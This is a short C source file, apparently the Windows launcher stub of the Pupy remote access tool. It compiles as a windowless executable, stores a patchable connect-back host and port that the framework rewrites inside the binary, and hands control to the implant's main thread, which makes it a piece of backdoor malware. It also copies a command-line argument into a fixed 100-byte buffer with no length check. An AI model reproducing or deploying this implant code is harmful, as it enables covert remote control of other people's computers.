#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "pupy_load.h"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")


/* value "<default_connect_back_host>:<default_connect_back_port>" will be searched/replaced by the framework to change pupy connect back IP without recompiling the DLL */
char connect_back_host[100]="<default_connect_back_host>:<default_connect_back_port>"; //big array to have space for big domain names.
int main(int argc, char *argv[]){
	if (argc==2){
		memcpy(connect_back_host, argv[1], strlen(argv[1])+1);
	}
	if(strcmp(connect_back_host,"<default_connect_back_host>:<default_connect_back_port>")==0){
		printf("usage: %s <host>:<port>",argv[0]);
		return 1;
	}
	return mainThread(NULL);
}

